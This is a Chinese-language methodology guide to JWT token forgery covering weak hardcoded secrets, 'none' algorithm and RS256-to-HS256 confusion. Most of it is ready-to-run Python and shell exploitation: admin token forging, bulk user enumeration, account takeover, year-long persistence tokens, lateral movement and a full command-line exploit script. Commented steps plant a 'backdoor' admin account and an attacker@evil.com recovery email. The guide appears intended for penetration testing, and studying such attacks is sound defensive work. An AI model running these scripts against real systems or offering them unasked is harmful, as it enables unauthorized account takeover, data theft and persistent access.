# JWT 令牌伪造攻击方法论

## 1. 技术概述

### 1.1 漏洞原理
JWT（JSON Web Token）令牌伪造攻击发生在以下场景：
- **硬编码弱密钥**：应用程序使用硬编码的、可预测的或弱密钥作为 JWT 签名密钥
- **密钥泄露**：JWT 密钥通过源代码、配置文件、错误消息等途径泄露
- **算法混淆**：未正确验证 JWT 算法，允许"none"算法或算法替换攻击

**本质**：攻击者获取或推断出 JWT 签名密钥后，可以伪造任意有效令牌，实现完全的身份认证绕过。

### 1.2 攻击影响
- **完全认证绕过**：无需有效凭证即可登录任意账户
- **权限提升**：可伪造管理员或高权限账户令牌
- **横向移动**：可 impersonate 任何用户访问其数据
- **持久化访问**：可设置长过期时间的令牌实现持久访问

---

## 2. 攻击常见业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **开源/泄露源代码** | GitHub 仓库、代码审计 | JWT 密钥硬编码在源代码中（如 `SECRET_KEY = "a very secret key"`） |
| **默认配置未修改** | 框架默认密钥、示例代码密钥 | 使用框架/教程中的示例密钥（如 "secret"、"changeme"） |
| **错误消息泄露** | 调试模式开启、详细错误 | 错误堆栈或调试信息中暴露密钥 |
| **客户端存储密钥** | 移动端应用、桌面应用 | 客户端代码中硬编码用于验证的密钥 |
| **弱密钥选择** | 简单密码、字典单词 | 密钥强度不足可被暴力破解或字典攻击 |

---

## 3. 漏洞探测方法

### 3.1 黑盒测试

#### 3.1.1 JWT 令牌识别
```bash
# 识别 JWT 令牌格式（Base64Url 编码，三段式结构）
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

# 解码 JWT 头部和载荷（无需密钥）
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}

echo "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ" | base64 -d
# {"sub":"1234567890","name":"John Doe","iat":1516239022}
```

#### 3.1.2 常见弱密钥测试
```bash
# 使用常见弱密钥尝试伪造令牌
common_secrets=(
    "secret"
    "Secret"
    "SECRET"
    "a very secret key"
    "changeme"
    "password"
    "key"
    "jwt_secret"
    "your-256-bit-secret"
    "your-secret-key"
    "supersecret"
    "mysecret"
    "test"
    "demo"
    ""
)

# 对每个密钥尝试签名并验证
for secret in "${common_secrets[@]}"; do
    # 使用 jwt 工具或 Python 脚本尝试签名
    python3 -c "
import jwt
payload = {'sub': '1', 'test': True}
try:
    token = jwt.encode(payload, '$secret', algorithm='HS256')
    print(f'Tried: $secret -> Token generated')
except Exception as e:
    print(f'Tried: $secret -> Error: {e}')
"
done
```

#### 3.1.3 算法混淆测试
```bash
# 测试"none"算法漏洞
# 1. 修改 JWT 头部为 {"alg":"none","typ":"JWT"}
# 2. 使用空签名生成令牌
python3 -c "
import jwt
# 尝试 none 算法（某些实现会接受）
payload = {'sub': 'admin', 'role': 'admin'}
token = jwt.encode(payload, '', algorithm='none')
print(token)
"

# 测试 RS256 -> HS256 算法混淆
# 如果服务器使用 RS256（非对称），尝试用公钥作为 HS256 密钥
```

### 3.2 白盒测试

#### 3.2.1 源代码审计关键词
```python
# Python/Jose 关键词搜索
grep -rn "SECRET_KEY" --include="*.py"
grep -rn "JWT_SECRET" --include="*.py"
grep -rn "jwt.encode" --include="*.py"
grep -rn "jwt.decode" --include="*.py"
grep -rn "ALGORITHM" --include="*.py" | grep -i "HS256\|HS512"

# Node.js/jsonwebtoken 关键词搜索
grep -rn "jwt.sign" --include="*.js"
grep -rn "jwt.verify" --include="*.js"
grep -rn "JWT_SECRET" --include="*.js"
grep -rn "process.env.JWT" --include="*.js"

# Java/jjwt 关键词搜索
grep -rn "Jwts.builder" --include="*.java"
grep -rn "Jwts.parser" --include="*.java"
grep -rn "JWT_SECRET" --include="*.java"
```

#### 3.2.2 配置文件检查
```bash
# 检查常见配置文件中的 JWT 密钥
grep -rn "secret" .env .config config.json settings.py application.yml
grep -rn "jwt" .env .config config.json settings.py application.yml
grep -rn "key" .env .config config.json settings.py application.yml | grep -i "secret\|sign"
```

#### 3.2.3 数据流追踪
1. **定位 JWT 生成点**：找到 `jwt.encode()` 或等价函数调用
2. **追踪密钥来源**：检查 `SECRET_KEY` 变量定义和赋值
3. **验证密钥强度**：
   - 是否为硬编码字符串
   - 是否来自环境变量
   - 是否使用安全随机数生成
4. **检查密钥使用**：
   - 编码和解码是否使用相同密钥
   - 密钥是否在客户端暴露

---

## 4. 漏洞利用方法

### 4.1 基础信息收集

#### 4.1.1 识别 JWT 结构
```python
import jwt
import base64

def decode_jwt_unsafe(token):
    """不安全解码 JWT（不验证签名）"""
    parts = token.split('.')
    if len(parts) != 3:
        raise ValueError("Invalid JWT")
    
    header = base64.urlsafe_b64decode(parts[0] + '==')
    payload = base64.urlsafe_b64decode(parts[1] + '==')
    
    return {
        'header': header.decode(),
        'payload': payload.decode()
    }

# 示例
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiZXhwIjoxNzYxOTcwMDEyfQ.xxx"
info = decode_jwt_unsafe(token)
print(f"Header: {info['header']}")
print(f"Payload: {info['payload']}")
```

#### 4.1.2 识别令牌用途
- **sub 字段**：通常包含用户 ID 或用户名
- **role/permissions 字段**：权限级别（如果有）
- **exp 字段**：过期时间
- **iat 字段**：签发时间

### 4.2 令牌伪造攻击

#### 4.2.1 已知密钥伪造（HS256）
```python
import jwt
from datetime import datetime, timedelta

# 场景：已发现硬编码密钥 "a very secret key"
SECRET_KEY = "a very secret key"
ALGORITHM = "HS256"

# 伪造任意用户令牌
def forge_token(user_id, role=None, expire_hours=24):
    payload = {
        "sub": str(user_id),  # 目标用户 ID
        "exp": datetime.utcnow() + timedelta(hours=expire_hours)
    }
    
    if role:
        payload["role"] = role
    
    token = jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)
    return token

# 示例：伪造管理员令牌
admin_token = forge_token(user_id="1", role="admin", expire_hours=168)
print(f"Forged admin token: {admin_token}")

# 使用伪造令牌访问
import requests
cookies = {"access_token": f"Bearer {admin_token}"}
response = requests.get("http://target/admin/dashboard", cookies=cookies)
print(response.status_code)
```

#### 4.2.2 权限提升伪造
```python
# 场景：标准用户想提升为管理员
# 原始令牌：{"sub": "123", "role": "user"}
# 目标令牌：{"sub": "123", "role": "admin"}

def escalate_privilege(current_token, new_role="admin"):
    # 解码当前令牌获取用户 ID
    import base64
    parts = current_token.split('.')
    payload = base64.urlsafe_b64decode(parts[1] + '==')
    user_data = eval(payload.decode())  # 或使用 json.loads
    
    user_id = user_data.get('sub')
    
    # 伪造高权限令牌
    new_payload = {
        "sub": user_id,
        "role": new_role,
        "exp": datetime.utcnow() + timedelta(hours=24)
    }
    
    return jwt.encode(new_payload, SECRET_KEY, algorithm=ALGORITHM)

# 执行权限提升
escalated_token = escalate_privilege(victim_token, "admin")
```

#### 4.2.3 批量伪造令牌
```python
# 为所有用户生成有效令牌
user_ids = range(1, 101)  # 假设用户 ID 范围 1-100

for uid in user_ids:
    token = forge_token(uid)
    print(f"User {uid}: {token}")
    
    # 测试令牌有效性
    try:
        response = requests.get(
            f"http://target/api/user/{uid}/profile",
            cookies={"access_token": f"Bearer {token}"}
        )
        if response.status_code == 200:
            print(f"✓ User {uid} token valid")
    except Exception as e:
        print(f"✗ User {uid} token invalid: {e}")
```

### 4.3 实际利用场景

#### 4.3.1 访问未授权资源
```bash
# 1. 伪造目标用户令牌
python3 -c "
import jwt
from datetime import datetime, timedelta

payload = {'sub': '2', 'exp': datetime.utcnow() + timedelta(hours=24)}
token = jwt.encode(payload, 'a very secret key', algorithm='HS256')
print(token)
"

# 2. 使用伪造令牌访问
FORGED_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyIiwiZXhwIjoxNzYxOTcwMDEyfQ.xxx"

curl -b "access_token=Bearer $FORGED_TOKEN" \
     http://target/protected/resource

# 3. 验证访问成功
# 预期：返回 200 OK 和目标资源
```

#### 4.3.2 完全账户接管
```python
import requests
from datetime import datetime, timedelta
import jwt

def takeover_account(target_user_id, jwt_secret):
    """完全接管目标账户"""
    
    # 1. 伪造令牌
    payload = {
        "sub": str(target_user_id),
        "exp": datetime.utcnow() + timedelta(days=30)  # 30 天有效期
    }
    token = jwt.encode(payload, jwt_secret, algorithm="HS256")
    
    # 2. 访问账户敏感信息
    session = requests.Session()
    session.cookies.set("access_token", f"Bearer {token}")
    
    # 获取个人资料
    profile = session.get("http://target/api/profile")
    print(f"Profile: {profile.json()}")
    
    # 获取订单历史
    orders = session.get("http://target/api/orders")
    print(f"Orders: {orders.json()}")
    
    # 修改密码（如果可能）
    # new_password = requests.post("http://target/api/change-password", ...)
    
    return token

# 执行账户接管
admin_token = takeover_account("1", "a very secret key")
```

#### 4.3.3 持久化访问
```python
# 生成超长有效期的令牌
def create_persistent_token(user_id, jwt_secret, days=365):
    payload = {
        "sub": str(user_id),
        "exp": datetime.utcnow() + timedelta(days=days),
        "iat": datetime.utcnow()  # 签发时间
    }
    return jwt.encode(payload, jwt_secret, algorithm="HS256")

# 为后续访问创建持久令牌
persistent_token = create_persistent_token("admin", "a very secret key", days=365)
print(f"Persistent token (valid 1 year): {persistent_token}")

# 保存令牌供后续使用
with open("persistent_token.txt", "w") as f:
    f.write(persistent_token)
```

---

## 5. 漏洞利用绕过方法

### 5.1 绕过密钥轮换检测

#### 5.1.1 多密钥测试
```python
# 如果应用支持多密钥，测试所有可能密钥
possible_secrets = [
    "a very secret key",
    "old_secret_key",  # 可能存在的旧密钥
    "new_secret_key",  # 可能的新密钥
    "secret_key_v1",
    "secret_key_v2"
]

def test_all_keys(payload_data, possible_secrets):
    valid_tokens = []
    
    for secret in possible_secrets:
        try:
            token = jwt.encode(payload_data, secret, algorithm="HS256")
            
            # 测试令牌是否有效
            response = requests.get(
                "http://target/api/test",
                cookies={"access_token": f"Bearer {token}"}
            )
            
            if response.status_code == 200:
                valid_tokens.append((secret, token))
                print(f"✓ Valid token with key: {secret}")
        except Exception as e:
            continue
    
    return valid_tokens
```

### 5.2 绕过算法验证

#### 5.2.1 None 算法攻击
```python
import base64
import json

def create_none_algorithm_token(payload_dict):
    """创建使用 none 算法的令牌（如果服务器接受）"""
    
    # 头部指定 none 算法
    header = {"alg": "none", "typ": "JWT"}
    
    # Base64Url 编码
    header_b64 = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).decode().rstrip('=')
    
    payload_b64 = base64.urlsafe_b64encode(
        json.dumps(payload_dict).encode()
    ).decode().rstrip('=')
    
    # 空签名
    signature = ""
    
    return f"{header_b64}.{payload_b64}.{signature}"

# 测试
none_token = create_none_algorithm_token({"sub": "admin", "role": "admin"})
print(f"None algorithm token: {none_token}")
```

#### 5.2.2 RS256 -> HS256 混淆
```python
def rs256_to_hs256_attack(payload_dict, public_key_pem):
    """
    RS256 到 HS256 算法混淆攻击
    如果服务器使用 RS256 但未正确验证算法，可用公钥作为 HS256 密钥
    """
    
    # 使用公钥作为 HS256 密钥
    token = jwt.encode(payload_dict, public_key_pem, algorithm="HS256")
    
    # 修改头部为 RS256（欺骗服务器）
    parts = token.split('.')
    header = {"alg": "RS256", "typ": "JWT"}
    header_b64 = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).decode().rstrip('=')
    
    return f"{header_b64}.{parts[1]}.{parts[2]}"
```

### 5.3 绕过过期时间验证

#### 5.3.1 忽略 exp 字段的服务器
```python
# 某些服务器可能未正确验证 exp 字段
def test_exp_validation(token):
    """测试服务器是否正确验证过期时间"""
    
    # 创建已过期的令牌
    expired_payload = {
        "sub": "1",
        "exp": datetime(2020, 1, 1)  # 已过期
    }
    expired_token = jwt.encode(expired_payload, SECRET_KEY, algorithm="HS256")
    
    # 测试是否仍被接受
    response = requests.get(
        "http://target/api/protected",
        cookies={"access_token": f"Bearer {expired_token}"}
    )
    
    if response.status_code == 200:
        print("⚠ Server does NOT validate exp claim!")
        return True
    return False
```

### 5.4 无回显利用（盲测）

#### 5.4.1 基于响应时间的盲测
```python
import time

def blind_token_testing(target_url, cookie_name, test_tokens):
    """当无法直接看到响应内容时，基于响应时间判断令牌有效性"""
    
    results = []
    
    for token in test_tokens:
        start_time = time.time()
        
        response = requests.get(
            target_url,
            cookies={cookie_name: f"Bearer {token}"}
        )
        
        elapsed = time.time() - start_time
        
        # 有效令牌通常返回更快（无需重定向到登录）
        if elapsed < 0.5:  # 小于 500ms
            results.append((token, "LIKELY_VALID", elapsed))
        else:
            results.append((token, "LIKELY_INVALID", elapsed))
    
    return results
```

---

## 6. 后渗透利用

### 6.1 信息收集
```python
def enumerate_with_forged_token(base_url, user_token):
    """使用伪造令牌进行信息收集"""
    
    session = requests.Session()
    session.cookies.set("access_token", f"Bearer {user_token}")
    
    # 收集的信息
    collected = {}
    
    # 1. 获取当前用户信息
    profile = session.get(f"{base_url}/api/profile")
    collected['profile'] = profile.json()
    
    # 2. 获取用户列表（如果权限允许）
    users = session.get(f"{base_url}/api/users")
    if users.status_code == 200:
        collected['users'] = users.json()
    
    # 3. 获取敏感配置
    config = session.get(f"{base_url}/api/config")
    if config.status_code == 200:
        collected['config'] = config.json()
    
    return collected
```

### 6.2 横向移动
```python
def lateral_movement(base_url, compromised_token, target_user_ids):
    """使用伪造令牌横向移动到多个账户"""
    
    for target_id in target_user_ids:
        # 伪造目标用户令牌
        new_token = jwt.encode(
            {"sub": str(target_id), "exp": datetime.utcnow() + timedelta(hours=1)},
            SECRET_KEY,
            algorithm="HS256"
        )
        
        # 访问目标用户资源
        session = requests.Session()
        session.cookies.set("access_token", f"Bearer {new_token}")
        
        # 获取敏感数据
        response = session.get(f"{base_url}/api/user/{target_id}/sensitive")
        
        if response.status_code == 200:
            print(f"✓ Accessed user {target_id} data")
            # 保存数据...
```

### 6.3 权限持久化
```python
def establish_persistence(base_url, admin_token):
    """建立持久化访问"""
    
    session = requests.Session()
    session.cookies.set("access_token", f"Bearer {admin_token}")
    
    # 1. 创建新管理员账户（如果可能）
    # new_admin = session.post(f"{base_url}/api/admin/create-user", {
    #     "username": "backdoor",
    #     "password": "backdoor123",
    #     "role": "admin"
    # })
    
    # 2. 修改现有账户权限
    # session.put(f"{base_url}/api/admin/users/1/role", {"role": "admin"})
    
    # 3. 添加备用认证方法
    # session.post(f"{base_url}/api/security/backup-email", {"email": "attacker@evil.com"})
    
    # 4. 创建长有效期令牌
    persistent_token = jwt.encode(
        {"sub": "1", "role": "admin", "exp": datetime.utcnow() + timedelta(days=365)},
        SECRET_KEY,
        algorithm="HS256"
    )
    
    return persistent_token
```

---

## 7. 自动化利用脚本

### 7.1 完整利用脚本
```python
#!/usr/bin/env python3
"""
JWT Token Forgery Exploitation Script
目标：使用硬编码密钥伪造 JWT 令牌实现认证绕过
"""

import jwt
import requests
from datetime import datetime, timedelta
import argparse
import sys

class JWTForgeryExploit:
    def __init__(self, target_url, jwt_secret, algorithm="HS256"):
        self.target_url = target_url
        self.jwt_secret = jwt_secret
        self.algorithm = algorithm
        self.session = requests.Session()
    
    def forge_token(self, user_id, role=None, expire_hours=24, extra_claims=None):
        """伪造 JWT 令牌"""
        payload = {
            "sub": str(user_id),
            "exp": datetime.utcnow() + timedelta(hours=expire_hours)
        }
        
        if role:
            payload["role"] = role
        
        if extra_claims:
            payload.update(extra_claims)
        
        return jwt.encode(payload, self.jwt_secret, algorithm=self.algorithm)
    
    def test_token(self, token, endpoint="/api/profile"):
        """测试令牌有效性"""
        self.session.cookies.set("access_token", f"Bearer {token}")
        
        try:
            response = self.session.get(f"{self.target_url}{endpoint}")
            return response.status_code == 200, response.text
        except Exception as e:
            return False, str(e)
    
    def enumerate_users(self, user_id_range, endpoint="/api/profile"):
        """批量枚举用户"""
        valid_users = []
        
        for uid in user_id_range:
            token = self.forge_token(uid)
            valid, _ = self.test_token(token, endpoint)
            
            if valid:
                valid_users.append(uid)
                print(f"✓ User {uid} exists and token valid")
            else:
                print(f"✗ User {uid} - invalid")
        
        return valid_users
    
    def escalate_privilege(self, user_id, target_role="admin"):
        """权限提升"""
        token = self.forge_token(user_id, role=target_role)
        return token
    
    def takeover_account(self, user_id, save_to_file=None):
        """完全账户接管"""
        # 伪造长有效期令牌
        token = self.forge_token(user_id, expire_hours=24*30)
        
        print(f"\n[+] Account Takeover Successful!")
        print(f"[+] User ID: {user_id}")
        print(f"[+] Token: {token}")
        print(f"[+] Valid for: 30 days")
        
        if save_to_file:
            with open(save_to_file, 'w') as f:
                f.write(token)
            print(f"[+] Token saved to {save_to_file}")
        
        return token

def main():
    parser = argparse.ArgumentParser(description='JWT Token Forgery Exploitation')
    parser.add_argument('-t', '--target', required=True, help='Target URL')
    parser.add_argument('-s', '--secret', required=True, help='JWT Secret Key')
    parser.add_argument('-u', '--user', type=int, help='Target User ID')
    parser.add_argument('-r', '--role', help='Target Role (for privilege escalation)')
    parser.add_argument('-e', '--enumerate', action='store_true', help='Enumerate users')
    parser.add_argument('-o', '--output', help='Output file for token')
    
    args = parser.parse_args()
    
    exploit = JWTForgeryExploit(args.target, args.secret)
    
    if args.enumerate:
        print("[*] Enumerating users 1-100...")
        valid = exploit.enumerate_users(range(1, 101))
        print(f"\n[+] Found {len(valid)} valid users: {valid}")
    
    elif args.user:
        if args.role:
            print(f"[*] Escalating user {args.user} to {args.role}...")
            token = exploit.escalate_privilege(args.user, args.role)
            print(f"[+] Escalation token: {token}")
        else:
            print(f"[*] Taking over user {args.user}...")
            exploit.takeover_account(args.user, args.output)
    
    else:
        print("[*] Forging test token...")
        token = exploit.forge_token(1)
        valid, response = exploit.test_token(token)
        print(f"Token valid: {valid}")
        if valid:
            print(f"Response: {response[:200]}")

if __name__ == "__main__":
    main()
```

---

## 8. 常用 Payload 速查表

| 类别 | Payload | 说明 |
|-----|--------|------|
| **常见弱密钥** | `secret` | 最常见弱密钥 |
| **常见弱密钥** | `a very secret key` | 示例代码常用 |
| **常见弱密钥** | `changeme` | 默认密钥 |
| **常见弱密钥** | `your-256-bit-secret` | JWT 库示例 |
| **常见弱密钥** | `jwt_secret` | 直白命名 |
| **常见弱密钥** | `password` | 弱密码 |
| **常见弱密钥** | `` (空字符串) | 空密钥 |
| **Payload** | `{"sub": "1", "role": "admin"}` | 管理员伪造 |
| **Payload** | `{"sub": "admin", "exp": <far_future>}` | 持久访问 |
| **算法攻击** | `{"alg": "none"}` | None 算法 |
| **算法攻击** | RS256→HS256 | 算法混淆 |

---

## 9. 参考资源

- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [PortSwigger - JWT Attacks](https://portswigger.net/web-security/jwt)
- [jwt.io - JWT Debugger](https://jwt.io/)
- [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
